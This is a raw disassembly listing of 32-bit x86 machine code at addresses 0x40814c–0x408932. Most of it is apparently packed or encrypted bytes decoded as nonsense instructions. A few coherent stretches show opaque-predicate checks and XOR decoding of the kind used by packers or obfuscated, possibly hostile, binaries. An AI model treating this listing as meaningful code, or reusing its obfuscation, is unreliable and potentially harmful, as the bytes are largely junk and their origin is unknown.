  40814c:	fs bound ecx,QWORD PTR gs:[di]
  408151:	add    ebp,ebp
  408153:	push   ebx
  408154:	sbb    edx,ebp
  408156:	fisubr DWORD PTR [edi+0x7cd25b77]
  40815c:	jl     0x408135
  40815e:	jns    0x4081dc
  408160:	jl     0x408138
  408162:	(bad)  
  408163:	xor    al,BYTE PTR [edi]
  408165:	push   edi
  408166:	jge    0x308d88ad
  40816c:	push   cs
  40816d:	mov    bh,0x2
  40816f:	and    ch,BYTE PTR [edx+esi*8+0x34ef5eb8]
  408176:	and    eax,DWORD PTR [eax-0x21631946]
  40817c:	in     al,0xdd
  40817e:	and    al,0x99
  408180:	or     DWORD PTR [esi-0x1e],0x14533c5d
  408187:	scas   al,BYTE PTR es:[edi]
  408188:	mov    al,0x94
  40818a:	mov    ebp,0x26fa6965
  40818f:	mov    bh,0xc
  408191:	jbe    0x4081f1
  408193:	cdq    
  408194:	jmp    0x40818b
  408196:	xchg   ebp,eax
  408197:	push   ds
  408198:	cmp    DWORD PTR [ebx+0x43],0xffffffab
  40819c:	inc    edi
  40819d:	lahf   
  40819e:	pop    ss
  40819f:	cmp    ch,BYTE PTR [ebp-0x4f]
  4081a2:	mov    dl,0xd9
  4081a4:	pop    ebx
  4081a5:	jae    0x4081ab
  4081a7:	ss push edx
  4081aa:	xchg   edi,eax
  4081ab:	or     edi,DWORD PTR [edx]
  4081ad:	adc    al,0x28
  4081af:	inc    edi
  4081b0:	test   BYTE PTR [esi-0x6b9d7f25],cl
  4081b6:	sub    edi,DWORD PTR [edx-0x6842f1b0]
  4081bc:	out    0xf9,eax
  4081be:	js     0x408229
  4081c0:	xor    BYTE PTR [esi],0x45
  4081c3:	mov    bl,0xbd
  4081c5:	test   eax,0x81e485fa
  4081ca:	test   al,0xe9
  4081cc:	mov    ds:0x535559a9,eax
  4081d1:	aad    0xa8
  4081d3:	cmp    al,0x57
  4081d5:	xchg   ebp,eax
  4081d6:	mov    ch,0xce
  4081d8:	ins    DWORD PTR es:[edi],dx
  4081d9:	push   ecx
  4081da:	fs ss jg 0x4081d6
  4081de:	pop    ebp
  4081df:	xor    BYTE PTR [ebx+0x4a046e40],dh
  4081e5:	loope  0x4081c5
  4081e7:	mov    bh,0xae
  4081e9:	mov    bl,0xef
  4081eb:	cmp    BYTE PTR [esp+edx*4],0x90
  4081ef:	ret    
  4081f0:	or     eax,0xa2a0234d
  4081f5:	test   DWORD PTR [eax-0x42],eax
  4081f8:	fdivrp st(4),st
  4081fa:	pop    esp
  4081fb:	shr    BYTE PTR [edx+ecx*2-0x4a],0x27
  408200:	sbb    BYTE PTR [edi+0x6f395df1],0xf7
  408207:	push   ds
  408208:	shl    DWORD PTR [edx],1
  40820a:	call   0xe6e4a053
  40820f:	mov    ds:0x3ea71312,eax
  408214:	cmp    cl,BYTE PTR [ebp+0x72]
  408217:	idiv   DWORD PTR [edi-0x35eabb44]
  40821d:	mov    edi,0xf4216f2e
  408222:	loopne 0x408248
  408224:	ror    BYTE PTR [edi+0x3c24825f],0x60
  40822b:	cmc    
  40822c:	xor    cl,al
  40822e:	jge    0x4081d8
  408230:	or     esi,DWORD PTR [ebx+0x56]
  408233:	jmp    0x40820e
  408235:	mov    ah,0x88
  408237:	xchg   esi,eax
  408238:	imul   edx,DWORD PTR [edi],0x5ca2303b
  40823e:	in     eax,0x99
  408240:	adc    eax,0x3b8af3a4
  408245:	mov    al,ds:0x892a14a3
  40824b:	icebp  
  40824c:	iret   
  40824d:	dec    ebx
  40824e:	ficomp DWORD PTR [edx-0x68c97b94]
  408254:	adc    BYTE PTR cs:[eax],0xd1
  408258:	xchg   ebx,eax
  408259:	idiv   DWORD PTR [edx-0x2650c322]
  40825f:	enter  0x664d,0xf0
  408263:	sar    DWORD PTR [eax-0x21ac949],1
  408269:	in     eax,dx
  40826a:	mov    bh,0xe
  40826c:	in     al,0xd4
  40826e:	push   ebx
  40826f:	repz icebp 
  408271:	cmp    BYTE PTR [ecx+0x52b7323c],ah
  408277:	or     eax,0x937736ae
  40827c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40827d:	pop    ebx
  40827e:	xchg   edx,eax
  40827f:	jmp    FWORD PTR [esp+edi*1]
  408282:	out    dx,eax
  408283:	lods   al,BYTE PTR ds:[esi]
  408284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408285:	sahf   
  408286:	pop    ds
  408287:	addr16 push cs
  408289:	(bad)  
  40828a:	in     eax,dx
  40828b:	jp     0x4082d3
  40828d:	shr    BYTE PTR [ebx+0x34],cl
  408290:	xchg   ecx,eax
  408291:	ja     0x4082bd
  408293:	add    al,0x5b
  408295:	ja     0x4082f5
  408297:	jmp    0xbf73:0x30d9d714
  40829e:	pop    eax
  40829f:	ffreep st(6)
  4082a1:	ror    DWORD PTR ds:0x71d5ef58,0x71
  4082a8:	add    BYTE PTR [ebx-0x36],0x2
  4082ac:	ret    0x6a8c
  4082af:	jnp    0x408278
  4082b1:	in     al,0x13
  4082b3:	or     ah,BYTE PTR [ecx]
  4082b5:	data16 loope 0x408278
  4082b8:	jle    0x408275
  4082ba:	das    
  4082bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082bc:	xchg   BYTE PTR [ebp+0x75ad7199],bh
  4082c2:	mov    ds:0x5095a2aa,eax
  4082c7:	or     cl,BYTE PTR [ecx]
  4082c9:	ror    DWORD PTR [edi+0x78],0x1c
  4082cd:	push   ss
  4082ce:	(bad)  [esi+ecx*1]
  4082d1:	push   eax
  4082d2:	pop    ebp
  4082d3:	cmp    dh,BYTE PTR [edx-0x19fb644a]
  4082d9:	out    0xac,al
  4082db:	or     DWORD PTR [ebx-0x48],edi
  4082de:	and    DWORD PTR [eax-0x7d],edx
  4082e1:	out    0x96,al
  4082e3:	fldenv [eax+0x688d24f2]
  4082e9:	aam    0xb8
  4082eb:	std    
  4082ec:	inc    esp
  4082ed:	mov    edx,0xae294575
  4082f2:	jp     0x408316
  4082f4:	add    BYTE PTR [edx-0x26],dh
  4082f7:	(bad)
  4082fb:	push   esi
  4082fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082fd:	pop    edi
  4082fe:	les    ebx,FWORD PTR [eax]
  408300:	and    eax,0xd693cc78
  408305:	mov    dl,0x4b
  408307:	sub    eax,DWORD PTR [edx]
  408309:	add    al,BYTE PTR [edx+0x38]
  40830c:	push   0x12
  40830e:	push   ecx
  40830f:	push   edx
  408310:	loopne 0x4082a1
  408312:	xlat   BYTE PTR ds:[ebx]
  408313:	(bad)  
  408314:	mov    edi,0xa19b0c13
  408319:	mov    ebx,0x19d41588
  40831e:	in     al,dx
  40831f:	hlt    
  408320:	pop    edi
  408321:	call   0xb6f09c40
  408326:	lahf   
  408327:	or     eax,0xd836c877
  40832c:	push   edi
  40832d:	inc    edx
  40832e:	test   eax,0x141cf1e3
  408333:	test   DWORD PTR [edx+0x31e87413],edi
  408339:	add    al,0x46
  40833b:	shr    DWORD PTR [edx-0x1754ac9e],cl
  408341:	hlt    
  408342:	mov    ah,0x76
  408344:	mov    dl,BYTE PTR [ebp-0x17b444e2]
  40834a:	mov    ah,0x5d
  40834c:	mov    ah,0x89
  40834e:	inc    edx
  40834f:	leave  
  408350:	scas   al,BYTE PTR es:[edi]
  408351:	push   es
  408352:	aas    
  408353:	sub    al,0xa
  408355:	out    0x14,eax
  408357:	fmul   st(3),st
  408359:	pusha  
  40835a:	mov    dl,0x90
  40835c:	mov    edi,ecx
  40835e:	xchg   esp,ecx
  408360:	xor    bl,dh
  408362:	dec    edi
  408363:	mov    ch,0x44
  408365:	pop    esp
  408366:	shl    BYTE PTR [ebx],cl
  408368:	fldenv [edx+0x706d5d5]
  40836e:	sbb    bh,BYTE PTR [esp+ecx*4-0x297ae41]
  408375:	or     al,0x2d
  408377:	inc    esp
  408378:	pop    ebp
  408379:	ins    DWORD PTR es:[edi],dx
  40837a:	xor    eax,0x37650e6f
  40837f:	push   0x433d46fb
  408384:	push   eax
  408385:	ins    DWORD PTR es:[edi],dx
  408386:	out    0x99,eax
  408388:	mov    ch,0xbb
  40838a:	dec    edx
  40838b:	pop    esi
  40838c:	mov    ds:0xcd7d9690,al
  408391:	pop    ebx
  408392:	pop    ecx
  408393:	pop    ds
  408394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408395:	loopne 0x408411
  408397:	pop    esp
  408398:	mov    ebx,0x8c0340c1
  40839d:	inc    edi
  40839e:	lock mov DWORD PTR [ebp-0x71],ebx
  4083a2:	xor    bl,BYTE PTR [esi-0x788b3255]
  4083a8:	mov    edx,0x1f8bed1a
  4083ad:	sbb    eax,0xfa9de51a
  4083b2:	icebp  
  4083b3:	enter  0xb9a9,0x30
  4083b7:	xchg   DWORD PTR [ebx+0x20],ebx
  4083ba:	push   ebp
  4083bb:	push   es
  4083bc:	dec    esi
  4083bd:	je     0x40840a
  4083bf:	inc    ecx
  4083c0:	mov    eax,0x65c19f6e
  4083c5:	ret    0x2733
  4083c8:	xor    edx,DWORD PTR [ecx]
  4083ca:	popa   
  4083cb:	ja     0x408405
  4083cd:	ss nop
  4083cf:	or     BYTE PTR [eax-0x67],bl
  4083d2:	imul   ebp,DWORD PTR ds:0xe87fb007,0x41
  4083d9:	aam    0x9a
  4083db:	jns    0x4083e4
  4083dd:	dec    DWORD PTR [ecx]
  4083df:	and    eax,0x5ee41ade
  4083e4:	sbb    al,0x2a
  4083e6:	jg     0x408431
  4083e8:	mov    al,ds:0x92bfca3d
  4083ed:	mov    esp,0x9f306622
  4083f2:	into   
  4083f3:	fsub   st,st(5)
  4083f5:	ss push edx
  4083f7:	dec    eax
  4083f8:	sbb    DWORD PTR [ecx+0x4],ebp
  4083fb:	pop    edi
  4083fc:	cwde   
  4083fd:	cmp    al,0x63
  4083ff:	retf   0x9e53
  408402:	into   
  408403:	xchg   edx,eax
  408404:	mov    ds:0xe8ffdab6,al
  408409:	mov    WORD PTR [ecx+0x2b39ed25],fs
  40840f:	push   ecx
  408410:	test   al,0x20
  408412:	sub    eax,0xd87eb79a
  408417:	sub    eax,0x1799f5df
  40841c:	jl     0x40845d
  40841e:	jge    0x4083cf
  408420:	mov    ebp,0x30d20a75
  408425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408426:	pop    ebp
  408427:	dec    ecx
  408428:	sbb    ch,dl
  40842a:	fimul  DWORD PTR [ecx+0x52]
  40842d:	mov    ecx,0xd41324f6
  408432:	leave  
  408433:	scas   al,BYTE PTR es:[edi]
  408434:	mov    DWORD PTR [eax],esp
  408436:	fsub   QWORD PTR [edi+0x6]
  408439:	adc    al,0xc5
  40843b:	adc    ch,BYTE PTR [edx+0x67edbc6]
  408441:	adc    ebp,DWORD PTR [edi-0x44f18a17]
  408447:	pushf  
  408448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408449:	(bad)  
  40844a:	xchg   edi,eax
  40844b:	stc    
  40844c:	or     DWORD PTR [edi-0x72],ebx
  40844f:	pop    eax
  408450:	mov    gs,WORD PTR [ebp+esi*4+0x2b]
  408454:	add    dl,dl
  408456:	mov    ch,0xbb
  408458:	or     eax,ebx
  40845a:	cmp    al,0x2c
  40845c:	push   0x1d
  40845e:	add    eax,0x2e00cba3
  408463:	fsqrt  
  408465:	js     0x4084be
  408467:	and    ebp,0x3cd2a2f8
  40846d:	mov    DWORD PTR [ebx],esp
  40846f:	inc    esp
  408470:	mov    ?,WORD PTR [ebp+ecx*2+0xed26f81]
  408477:	fst    QWORD PTR [ebx+0x163cc11a]
  40847d:	cs icebp 
  40847f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408480:	dec    ecx
  408481:	hlt    
  408482:	sub    BYTE PTR [ebx+0x4f],ch
  408485:	in     eax,dx
  408486:	mov    ebp,0xb456185d
  40848b:	mov    DWORD PTR [ecx],edx
  40848d:	mov    edx,0x196ed6f9
  408492:	and    ebp,DWORD PTR [edx+0x73bbed79]
  408498:	ret    0xed67
  40849b:	jae    0x408474
  40849d:	js     0x408519
  40849f:	mov    ebp,0xebcc87d6
  4084a4:	push   edx
  4084a5:	sub    DWORD PTR [eax-0x28],ecx
  4084a8:	pushf  
  4084a9:	and    bh,cl
  4084ab:	fild   WORD PTR [edi+0x5f50367c]
  4084b1:	int3   
  4084b2:	not    esi
  4084b4:	jl     0x4084df
  4084b6:	push   ebp
  4084b7:	and    al,0x77
  4084b9:	pop    ds
  4084ba:	mov    eax,DWORD PTR [ebp-0x8]
  4084bd:	xor    eax,ecx
  4084bf:	add    eax,esi
  4084c1:	pop    edi
  4084c2:	pop    esi
  4084c3:	pop    ebx
  4084c4:	leave  
  4084c5:	ret    0x4
  4084c8:	mov    eax,DWORD PTR [ebp-0xc]
  4084cb:	add    eax,DWORD PTR [ebp-0x18]
  4084ce:	cmp    eax,0x50b25e45
  4084d3:	je     0x4084e7
  4084d9:	mov    eax,DWORD PTR [ebp-0x10]
  4084dc:	and    DWORD PTR [eax],0x751c9d
  4084e2:	jmp    0x4084ba
  4084e7:	mov    eax,DWORD PTR [ebp-0xc]
  4084ea:	mov    edx,DWORD PTR [ebp-0x18]
  4084ed:	or     eax,edx
  4084ef:	cmp    eax,0xf89f3dbd
  4084f4:	je     0x40887e
  4084fa:	mov    eax,DWORD PTR [ebp-0x10]
  4084fd:	jmp    0x408873
  408502:	pop    esi
  408503:	sahf   
  408504:	pop    edi
  408505:	pop    es
  408506:	pop    edi
  408507:	shl    DWORD PTR [esi+0x61],0xde
  40850b:	cdq    
  40850c:	outs   dx,BYTE PTR ds:[esi]
  40850d:	pop    esi
  40850e:	push   edx
  40850f:	imul   ecx,DWORD PTR [eax],0xffffffef
  408512:	xor    bl,dh
  408514:	jl     0x408592
  408516:	xlat   BYTE PTR ds:[ebx]
  408517:	jns    0x408595
  408519:	jl     0x4084f2
  40851b:	icebp  
  40851c:	daa    
  40851d:	or     eax,0xfe1be2e3
  408522:	sub    al,0x4a
  408524:	stc    
  408525:	sti    
  408526:	imul   ecx,DWORD PTR [edi],0x62a12ce5
  40852c:	int3   
  40852d:	aas    
  40852e:	mov    eax,ds:0xb4ccd642
  408533:	mov    ebp,0x76bcd931
  408538:	repnz adc al,0x3b
  40853b:	pop    ecx
  40853c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40853d:	mov    dl,0x77
  40853f:	fimul  WORD PTR [edi]
  408541:	in     eax,dx
  408542:	leave  
  408543:	cmp    DWORD PTR [eax+ebx*4],0xffffffb1
  408547:	sub    eax,0x6fa84ef4
  40854c:	dec    esi
  40854d:	push   bp
  40854f:	pusha  
  408550:	das    
  408551:	leave  
  408552:	mov    ah,0xb1
  408554:	adc    DWORD PTR [edi-0x55f939a0],edx
  40855a:	adc    eax,0x54964cd6
  40855f:	pop    ebp
  408560:	test   eax,0x4d4b1591
  408565:	jbe    0x408509
  408567:	push   ebp
  408568:	inc    ebx
  408569:	xchg   ebp,eax
  40856a:	scas   al,BYTE PTR es:[edi]
  40856b:	xchg   esp,eax
  40856c:	mov    esi,0xceb5d861
  408571:	test   esp,esp
  408573:	shr    edx,0x2
  408576:	retf   
  408577:	into   
  408578:	mov    dl,0xb2
  40857a:	test   DWORD PTR [ebx+0x5b87d4f5],eax
  408580:	push   esp
  408581:	in     al,0xfa
  408583:	add    BYTE PTR [ebx],cl
  408585:	add    eax,0xdbbf9019
  40858a:	in     al,dx
  40858b:	rcl    DWORD PTR [edx+0x45],1
  40858e:	push   es
  40858f:	add    al,cl
  408591:	xchg   ebx,eax
  408592:	xor    bl,al
  408594:	xchg   ebx,eax
  408595:	cmp    ah,BYTE PTR [edi+0x46]
  408598:	add    esp,DWORD PTR [eax-0x6be6d304]
  40859e:	loopne 0x408543
  4085a0:	(bad)  [edi-0x36]
  4085a3:	nop
  4085a4:	fild   WORD PTR [edi-0x7aa2cdb1]
  4085aa:	jge    0x4085db
  4085ac:	ins    BYTE PTR es:[edi],dx
  4085ad:	xor    eax,0x68897467
  4085b2:	std    
  4085b3:	xchg   edi,eax
  4085b4:	jge    0x4085e5
  4085b6:	jbe    0x408615
  4085b8:	adc    DWORD PTR [ebp-0x790c1ca1],0xf219bd82
  4085c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085c3:	jmp    0x974b:0x51d3cc02
  4085ca:	push   eax
  4085cb:	aaa    
  4085cc:	iret   
  4085cd:	mov    ebp,0x318403bb
  4085d2:	pop    edx
  4085d3:	sti    
  4085d4:	inc    esi
  4085d5:	rcl    BYTE PTR [ebp+ecx*1-0x12daffd],cl
  4085dc:	adc    eax,0x54840e0c
  4085e1:	mov    al,0xfc
  4085e3:	dec    edx
  4085e4:	jbe    0x408613
  4085e6:	mov    edx,esp
  4085e8:	add    ebp,DWORD PTR [esi]
  4085ea:	xchg   esi,eax
  4085eb:	outs   dx,DWORD PTR ds:[esi]
  4085ec:	mov    ds:0x4430e2e0,eax
  4085f1:	sar    BYTE PTR [edx+0x57ce20d3],0xe5
  4085f8:	mov    ecx,0x5f332225
  4085fd:	daa    
  4085fe:	ins    DWORD PTR es:[edi],dx
  4085ff:	or     DWORD PTR [ebp+0x4f6e16dc],eax
  408605:	pop    es
  408606:	adc    al,0xc4
  408608:	cmc    
  408609:	daa    
  40860a:	adc    cl,BYTE PTR [eax-0x5493572]
  408610:	cmp    al,0x5c
  408612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408613:	sbb    edx,DWORD PTR [ebp-0x13]
  408616:	sbb    BYTE PTR [edx-0x8],ah
  408619:	ja     0x4085a3
  40861b:	inc    esi
  40861c:	push   esp
  40861d:	and    esi,esp
  40861f:	fistp  WORD PTR [ebx+0x30c19e7f]
  408625:	into   
  408626:	xor    esp,DWORD PTR ds:0x9cd8254b
  40862c:	jecxz  0x40865c
  40862e:	mov    dh,0x64
  408630:	icebp  
  408631:	sbb    bl,cl
  408633:	pop    ecx
  408634:	add    esp,DWORD PTR [esi]
  408636:	lea    eax,[eax]
  408638:	pop    ss
  408639:	xchg   edi,eax
  40863a:	push   es
  40863b:	jmp    0x5018:0x1ab7d1d5
  408642:	div    BYTE PTR [edx]
  408644:	pop    esp
  408645:	mov    BYTE PTR [ebp-0x738d7884],bh
  40864b:	fdiv   QWORD PTR [ecx]
  40864d:	imul   esi,DWORD PTR [edi],0x7e
  408650:	pop    es
  408651:	icebp  
  408652:	lahf   
  408653:	xor    BYTE PTR [esi-0x49],bh
  408656:	or     DWORD PTR [ebp-0x73],edx
  408659:	mov    edx,0xcb2ac212
  40865e:	loop   0x4085e8
  408660:	ins    BYTE PTR es:[edi],dx
  408661:	cs aaa 
  408663:	inc    esi
  408664:	cmc    
  408665:	push   ds
  408666:	call   0x7500:0xc7ac5343
  40866d:	xchg   DWORD PTR [ecx],edx
  40866f:	pushf  
  408670:	mov    WORD PTR [edx+eax*8],fs
  408673:	ins    BYTE PTR es:[edi],dx
  408674:	mov    eax,eax
  408676:	xor    edi,DWORD PTR [ebx]
  408678:	xchg   ebx,eax
  408679:	loopne 0x40864a
  40867b:	pop    esp
  40867c:	stos   BYTE PTR es:[edi],al
  40867d:	shl    BYTE PTR [edx],0xed
  408680:	mov    BYTE PTR [ebx+0xcf94cac],cl
  408686:	bound  edi,QWORD PTR [ecx-0x37d4e648]
  40868c:	sub    DWORD PTR [eax-0x20],esp
  40868f:	inc    esp
  408690:	out    0x30,al
  408692:	inc    ebx
  408693:	jecxz  0x408657
  408695:	inc    ebp
  408696:	mov    bl,0x66
  408698:	sbb    al,0x30
  40869a:	scas   eax,DWORD PTR es:[edi]
  40869b:	adc    eax,0xb83cd95a
  4086a0:	cmc    
  4086a1:	push   ecx
  4086a2:	jge    0x408682
  4086a4:	dec    ecx
  4086a5:	push   esp
  4086a6:	mov    esi,0x609a9d3e
  4086ab:	mov    bl,0x9d
  4086ad:	mov    cl,0xb6
  4086af:	xchg   BYTE PTR [edi+0x79],al
  4086b2:	and    esi,edi
  4086b4:	mov    ch,0x6a
  4086b6:	ret    
  4086b7:	xchg   DWORD PTR [esi+0x1c],edx
  4086ba:	mov    edi,0x5987f7f1
  4086bf:	add    dh,BYTE PTR [eax]
  4086c1:	jnp    0x408729
  4086c3:	jae    0x40869e
  4086c5:	jnp    0x40873e
  4086c7:	push   ebp
  4086c8:	or     DWORD PTR [ebx],esi
  4086ca:	lods   eax,DWORD PTR ds:[esi]
  4086cb:	mov    es,ecx
  4086cd:	mov    dh,0x71
  4086cf:	js     0x4086a0
  4086d1:	stos   DWORD PTR es:[edi],eax
  4086d2:	lods   eax,DWORD PTR ds:[esi]
  4086d3:	inc    esi
  4086d4:	jle    0x4086e1
  4086d6:	and    eax,0x6ec8c3f6
  4086db:	test   al,0x6c
  4086dd:	loopne 0x408722
  4086df:	dec    ebx
  4086e0:	lea    edx,[edi-0x62]
  4086e3:	jl     0x408759
  4086e5:	std    
  4086e6:	push   es
  4086e7:	fwait
  4086e8:	mov    al,0xf4
  4086ea:	(bad)  
  4086eb:	sub    ch,BYTE PTR es:[ebx]
  4086ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086ef:	mov    ch,0xb9
  4086f1:	jae    0x40875a
  4086f3:	mov    eax,ds:0xc27aee52
  4086f8:	pusha  
  4086f9:	out    0xd8,al
  4086fb:	mov    eax,ds:0x50859567
  408700:	bnd jo 0x4086a7
  408703:	mov    ecx,0x674d6301
  408708:	nop    edx
  40870b:	xchg   ch,ah
  40870d:	xchg   DWORD PTR [edx],esp
  40870f:	mov    eax,0x22ad8ec9
  408714:	mov    DWORD PTR [eax],esp
  408716:	loop   0x4086e1
  408718:	in     eax,0xc4
  40871a:	mov    BYTE PTR ds:0xdb1b25cf,dh
  408720:	inc    ebp
  408721:	pop    edx
  408722:	fwait
  408723:	hlt    
  408724:	push   esp
  408725:	xor    eax,0xb2182e4f
  40872a:	ret    
  40872b:	jnp    0x408744
  40872d:	out    0xd7,eax
  40872f:	punpckhwd mm0,QWORD PTR [edx+ecx*1-0x563a7039]
  408737:	in     al,0xa4
  408739:	imul   esp,esi,0x6734e769
  40873f:	loopne 0x4086d6
  408741:	ins    DWORD PTR es:[edi],dx
  408742:	nop
  408743:	scas   eax,DWORD PTR es:[edi]
  408744:	(bad)  
  408745:	and    al,0xf
  408747:	std    
  408748:	pop    edi
  408749:	mov    esi,0x81683f9a
  40874e:	xor    al,0xcf
  408750:	push   esp
  408751:	adc    al,0x9e
  408753:	push   eax
  408754:	bound  ecx,QWORD PTR [edi*1-0x422c7c06]
  40875b:	mov    bh,0xec
  40875d:	lods   al,BYTE PTR ds:[esi]
  40875e:	fsubr  QWORD PTR [edx]
  408760:	xor    BYTE PTR [edi],al
  408762:	adc    BYTE PTR [esi-0x726f6a32],ch
  408768:	js     0x4087a1
  40876a:	lds    edx,FWORD PTR [edi]
  40876c:	das    
  40876d:	ret    
  40876e:	pop    es
  40876f:	jmp    0xc2bb:0xd8128d57
  408776:	mov    ?,ebx
  408778:	dec    DWORD PTR [ecx-0x5af03ce8]
  40877e:	sti    
  40877f:	in     eax,dx
  408780:	outs   dx,DWORD PTR ds:[esi]
  408781:	xchg   ecx,eax
  408782:	pop    es
  408783:	int3   
  408784:	outs   dx,BYTE PTR ds:[esi]
  408785:	lods   al,BYTE PTR ds:[esi]
  408786:	popf   
  408787:	mov    ds:0xf028c15c,eax
  40878c:	fiadd  WORD PTR [esi+ebp*8+0x1cbb1bb1]
  408793:	push   edx
  408794:	shl    BYTE PTR [edi-0x4acffea4],0x83
  40879b:	test   eax,0xee45c96e
  4087a0:	dec    esp
  4087a1:	and    edx,edx
  4087a3:	(bad)  
  4087a4:	in     al,dx
  4087a5:	pop    eax
  4087a6:	icebp  
  4087a7:	jns    0x4087a2
  4087a9:	dec    eax
  4087aa:	lods   al,BYTE PTR ds:[esi]
  4087ab:	pop    edx
  4087ac:	xor    DWORD PTR [eax],edi
  4087ae:	leave  
  4087af:	mov    WORD PTR [ecx],es
  4087b1:	stos   DWORD PTR es:[edi],eax
  4087b2:	int    0x81
  4087b4:	cmp    BYTE PTR [ebx],bh
  4087b6:	int    0x95
  4087b8:	xor    al,0x6c
  4087ba:	mov    cl,0xd
  4087bc:	repz inc edi
  4087be:	jb     0x4087af
  4087c0:	xchg   edx,eax
  4087c1:	xor    BYTE PTR [ecx+0x6260ddb7],cl
  4087c7:	es push esi
  4087c9:	mov    al,0x9c
  4087cb:	lds    esi,FWORD PTR [esi-0x3a]
  4087ce:	(bad)  
  4087cf:	jbe    0x40877d
  4087d1:	jge    0x4087fb
  4087d3:	xor    esi,DWORD PTR ds:0x47d8b61b
  4087d9:	push   ss
  4087da:	lods   eax,DWORD PTR ds:[esi]
  4087db:	adc    BYTE PTR [edi+0x42],ah
  4087de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087df:	and    ebp,DWORD PTR [ecx+0x13]
  4087e2:	jb     0x408813
  4087e4:	iret   
  4087e5:	mov    esi,0x37b86b16
  4087ea:	xchg   edi,eax
  4087eb:	(bad)  
  4087ec:	fsincos 
  4087ee:	retf   
  4087ef:	daa    
  4087f0:	daa    
  4087f1:	mov    edi,edx
  4087f3:	inc    eax
  4087f4:	dec    edx
  4087f5:	neg    BYTE PTR [eax]
  4087f7:	mov    esp,?
  4087f9:	and    al,BYTE PTR [edx+eax*8+0x68]
  4087fd:	in     al,dx
  4087fe:	jmp    0x408815
  408800:	dec    ebx
  408801:	or     esi,DWORD PTR [esi+0x557d71e8]
  408807:	add    al,0x14
  408809:	adc    al,0x8e
  40880b:	add    eax,0x11b28ffd
  408810:	adc    dl,BYTE PTR [ebp+0x6e]
  408813:	cs mov dl,0x39
  408816:	mov    ebp,0x82c9a63f
  40881b:	adc    ebx,DWORD PTR [edx+0xe]
  40881e:	sub    al,0xc2
  408820:	mov    ds:0x3422e020,eax
  408825:	into   
  408826:	xchg   DWORD PTR [edx],edi
  408828:	jmp    0x408857
  40882a:	fucomip st,st(3)
  40882c:	xor    al,0xeb
  40882e:	in     al,0x4
  408830:	pop    ebp
  408831:	dec    ebx
  408832:	aas    
  408833:	aaa    
  408834:	gs dec esp
  408836:	pop    edi
  408837:	jg     0x40882a
  408839:	jg     0x408837
  40883b:	adc    eax,0x67
  40883e:	push   es
  40883f:	push   ebx
  408840:	xor    BYTE PTR [edi+0x68875dc3],dl
  408846:	push   edx
  408847:	sub    dh,cl
  408849:	sbb    DWORD PTR [esi+0x59],ebp
  40884c:	adc    eax,DWORD PTR [esi-0x24]
  40884f:	gs pop ebx
  408851:	push   es
  408852:	ins    BYTE PTR es:[edi],dx
  408853:	stos   DWORD PTR es:[edi],eax
  408854:	rcr    bl,0x2
  408857:	cmp    ebx,DWORD PTR [ebx-0x6b731165]
  40885d:	add    al,0x6f
  40885f:	adc    eax,0x4986148
  408864:	cs mov fs:0x5251056c,al
  40886b:	arpl   sp,dx
  40886d:	test   esp,eax
  40886f:	icebp  
  408870:	cmp    al,0x14
  408872:	std    
  408873:	xor    DWORD PTR [eax],0x2650fa8f
  408879:	jmp    0x4084ba
  40887e:	mov    ax,WORD PTR [ebp-0x4]
  408882:	mov    edi,DWORD PTR [ebp+0x8]
  408885:	mov    edi,DWORD PTR [edi]
  408887:	mov    edx,0x8a3a
  40888c:	xor    ax,dx
  40888f:	mov    edx,0x3b00
  408894:	add    ax,dx
  408897:	cmp    ax,WORD PTR [edi]
  40889a:	je     0x409349
  4088a0:	mov    eax,DWORD PTR [ebp-0x14]
  4088a3:	xor    eax,ecx
  4088a5:	add    eax,esi
  4088a7:	mov    DWORD PTR [ebp-0x24],eax
  4088aa:	mov    eax,DWORD PTR [ebp-0x28]
  4088ad:	mov    di,WORD PTR [ebp-0x2c]
  4088b1:	mov    ebx,0x8a3a
  4088b6:	xor    di,bx
  4088b9:	add    di,dx
  4088bc:	movzx  edx,di
  4088bf:	mov    edi,DWORD PTR [ebp-0x8]
  4088c2:	xor    edi,ecx
  4088c4:	lea    edx,[edx+edi*1+0x32729a]
  4088cb:	add    DWORD PTR [eax],edx
  4088cd:	jmp    0x408c43
  4088d2:	add    al,0x63
  4088d4:	loop   0x4088d0
  4088d6:	ins    DWORD PTR es:[edi],dx
  4088d7:	test   DWORD PTR [ebp+ebp*2+0xe],esp
  4088db:	loop   0x408905
  4088dd:	add    al,0xdd
  4088df:	inc    edx
  4088e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088e1:	std    
  4088e2:	xchg   ebp,eax
  4088e3:	fstp   TBYTE PTR [esp+edi*2-0x29]
  4088e7:	jns    0x408965
  4088e9:	jl     0x408899
  4088eb:	inc    ebp
  4088ec:	xchg   ebp,eax
  4088ed:	push   eax
  4088ee:	push   0x7e
  4088f0:	call   0xfe67:0xcc64aac9
  4088f7:	adc    dl,bh
  4088f9:	loop   0x40893c
  4088fb:	cmp    esp,DWORD PTR [edx-0x520fb428]
  408901:	push   esp
  408902:	mov    dh,0x4e
  408904:	add    BYTE PTR [esi],dl
  408906:	loope  0x4088cd
  408908:	push   esi
  408909:	lds    ebx,FWORD PTR [ecx+0x4eb07ae1]
  40890f:	sub    DWORD PTR [edi+esi*1],ebp
  408912:	jmp    DWORD PTR [ebx+0x54d59189]
  408918:	pop    esp
  408919:	pushf  
  40891a:	jo     0x4088c3
  40891c:	ret    0x7c5c
  40891f:	in     al,0x2
  408921:	inc    eax
  408922:	(bad)  
  408923:	dec    edi
  408924:	mov    dl,0x49
  408926:	mov    es,WORD PTR [edi+0x793a18c4]
  40892c:	stos   BYTE PTR es:[edi],al
  40892d:	jmp    0x4088d0
  40892f:	je     0x4088b4
  408931:	inc    ebx
  408932:	js     0x40898e
